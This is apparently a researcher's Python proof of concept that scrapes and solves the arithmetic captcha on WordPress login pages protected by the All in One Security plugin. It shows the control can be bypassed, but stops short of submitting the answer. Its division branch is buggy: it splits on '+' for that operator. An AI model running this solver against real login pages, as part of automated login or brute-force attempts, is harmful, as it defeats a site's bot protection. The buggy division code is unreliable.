#!/usr/bin/env python3
#
# This is a proof of concept which shows that the All in One Security for Wordpress Plugin's Captcha is not safe and easly solvable by any machine
#  
# This script does not attack the website or post the result of the solved equation. The Division Operation is currently untested 
# In the Test section, change the parameter for the get_captcha_equation_from_url() call to the variable admin_login to test the admin logins captcha
# or to user_login to test the user login captcha.
# 
# If the Script fails, check the URL var and make sure it contains the basepath to your wordpress install without http:// or https:// 
#
# The script only supports double digit numbers but can easily scaled up for larger numbers

import requests
from bs4 import BeautifulSoup
URL= "localhost.local"

#####################################################SETUP THE EQUATION SOLVER#######################################################
ones = {  'zero': 0,'one': 1,'two': 2,'three': 3,'four': 4,'five': 5,'six': 6, 'seven': 7, 'eight': 8, 'nine': 9,'ten': 10, 'eleven': 11,
    'twelve': 12, 'thirteen': 13,'fourteen': 14,'fifteen': 15, 'sixteen': 16,'seventeen': 17,'eighteen': 18,'nineteen': 19} 
tenner = {'twenty': 20, 'thirty': 30,'forty': 40,'fifty': 50,'sixty': 60,'seventy': 70,'eighty': 80,'ninety': 90 }

def replace_word_with_number(word) -> int:    
    '''Returns a two digit number from a number word 
    for example eightyseven will return 87
    
    '''
    # check if the word is already in dicts
    if(word in ones):
        return ones[word]

    if(word in tenner):
        return tenner[word]
    # if not try to find its parts and add them up
    number=0
    for t in tenner:
        if t in word:
            number += tenner[t]
            word = word.replace(t,'_') # to avoid detecting double ones
    for w in ones:
        if w in word:
            number += ones[w]
    return number

def convert_strings_to_ints(strings) -> list:
    '''converts a list of strings into a list of integers'''
    numbers=[]
    for n in strings:       
        #test the number
        test = replace_word_with_number(n)
        n = int(n) if test == 0 or n == 'zero' else int(test)       
        numbers.append(n)
    return numbers

def solve_equation(equation):
    '''solves the simple equation'''
    # trimm the string
    equation = equation.replace(" ","")
    equation = equation.replace("=","")
  
    if '−' in equation:
        e = equation.split('−')
        numbers = convert_strings_to_ints(e)        
        return numbers[0] - numbers[1]

    if '+' in equation:
        numbers = convert_strings_to_ints(equation.split('+'))
        return numbers[0] + numbers[1]

    if ':' in equation or '/' in equation: # untestet
        numbers = convert_strings_to_ints(equation.split('+'))
        return numbers[0] / numbers[1]
    if '×' in equation:
        numbers = convert_strings_to_ints(equation.split('×'))
        return numbers[0] * numbers[1]

####################################################################GET THE LOGIN PAGE##############################################################################


def get_captcha_equation_from_url(url):
    ''' Gets the All in One Security Captcha from the url '''
    req = requests.get(url=url)
    soup = BeautifulSoup(req.content, features="html.parser")
    # select the captcha ny its CSS class name and the <strong> tag
    captcha_div = soup.select(".aiowps-captcha-equation > strong")
    return captcha_div[0].text



# vulnerable login pages
user_login = f"https://{URL}/my-account"
admin_login = f"https://{URL}/wp-admin"


###################################################################TEST EQUATION SOLVER############################################################################

# the equatioin is the first child of the selected div
equation = get_captcha_equation_from_url(user_login)

# solve the captcha id="aiowps-captcha-answer" 
print(solve_equation(equation))
